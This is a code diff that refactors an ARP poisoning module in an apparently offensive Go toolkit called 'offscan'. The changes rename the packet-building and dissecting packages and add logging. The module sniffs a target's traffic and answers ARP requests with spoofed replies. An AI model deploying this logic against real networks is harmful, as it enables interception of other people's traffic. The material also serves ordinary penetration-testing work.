@@ -21,8 +21,8 @@ import (
 	"context"
 	"fmt"
 	"net"
-	"offscan/internal/netroute"
-	"offscan/internal/packet"
+	"offscan/internal/pktbuild"
+	"offscan/internal/pktdissec"
 	"offscan/internal/sniffer"
 	"offscan/internal/sockets"
 	"offscan/internal/sysconf"
@@ -37,13 +37,13 @@ import (
 type arpPoison struct {
 	iface     net.Interface
 	addrs     addresses
-	builder  *packet.ArpPacket
+	builder  *pktbuild.ArpPacket
 	socket    sockets.Layer2Socket
 	sniffer  *sniffer.Sniffer
 	ctx       context.Context
 	cancel    context.CancelFunc
-	dissec   *packet.PacketDissector
-	idpkg     uint
+	dissec   *pktdissec.PacketDissector
+	pkts      uint
 }
 
 
@@ -59,33 +59,9 @@ type addresses struct {
 
 
 func Run(args []string) {
-    newArpPoison(args).execute()
-}
-
-
-
-func newArpPoison(args []string) *arpPoison {
-	parser := newParser()
-	parser.parseArpPoisonArgs(args)
-
-	iface := netroute.MustRouteIfaceForDstIP(parser.targetIP)
-
-	return &arpPoison{
-		iface : iface,
-		addrs : setAddrs(parser, &iface),
-	}
-}
-
-
-
-func setAddrs(parser *arpPoisonParser, iface *net.Interface) addresses {
-	return addresses{
-		myMAC     : iface.HardwareAddr,
-		targetMAC : parser.targetMAC,
-		targetIP  : parser.targetIP,
-		apMAC     : sysconf.MustGatewayMAC(iface),
-		apIP      : sysconf.MustGatewayIP(iface),
-	}
+	ap := arpPoison{}
+	ap.parseArgs(args)
+	ap.execute()
 }
 
 
@@ -104,7 +80,7 @@ func (ap *arpPoison) execute() {
 
 func (ap *arpPoison) initSniffTools() {
 	ap.sniffer = sniffer.NewSniffer(ap.iface, ap.getBPFFilter(), false)
-	ap.dissec  = packet.NewPacketDissector()
+	ap.dissec  = pktdissec.NewPacketDissector()
 	ap.createCtx()
 }
 
@@ -132,7 +108,7 @@ func (ap *arpPoison) createCtx() {
 
 func (ap *arpPoison) initPoisoningTools() {
 	ap.socket  = sockets.NewL2Socket(&ap.iface)
-	ap.builder = packet.NewArpPkt()
+	ap.builder = pktbuild.NewArpPkt()
 	ap.builder.SetReplyOpcode()
 	ap.setFixedPktData()
 }
@@ -195,6 +171,7 @@ func (ap *arpPoison) sendPoison() {
 
 func (ap *arpPoison) sniffTargetsTraffic() {
 	sniffCh := ap.sniffer.Start()
+	ap.displayExecInfo()
 
 	for {
 		select {
@@ -205,24 +182,36 @@ func (ap *arpPoison) sniffTargetsTraffic() {
 			pkt, ok := <-sniffCh
 			if !ok { return }
 			
+			ap.pkts++
 			ap.dissec.UpdatePkt(pkt)
-			ap.sendRequestedPoison()
+			
+			if ap.dissec.IsARP() && ap.dissec.IsArpRequest() {
+				ap.sendRequestedPoison()
+			}
 		}
 	}
 }
 
 
 
-func (ap *arpPoison) sendRequestedPoison() {
-	if !ap.dissec.IsArpRequest() {
-		return
-	}
+func (ap *arpPoison) displayExecInfo() {
+	fmt.Printf("[*] IFACE...: %s\n", ap.iface.Name)
+	fmt.Printf("[*] TARGET..: %s - %s\n", ap.addrs.targetMAC.String(), ap.addrs.targetIP.String())
+}
 
+
+
+func (ap *arpPoison) sendRequestedPoison() {
 	ap.setPoisonToTarget()
 	ap.sendPoison()
 
-	ap.idpkg++
-	fmt.Printf("%d Poison sent to target %s\n", ap.idpkg, ap.addrs.targetIP.String())
+	timeNow := time.Now().Format("2006-01-02 15:04:05")
+	fmt.Printf(
+		"%s - Poison sent to %s. Packets %d sniffed\n", 
+		timeNow, 
+		ap.addrs.targetIP.String(), 
+		ap.pkts,
+	)
 }
 
 
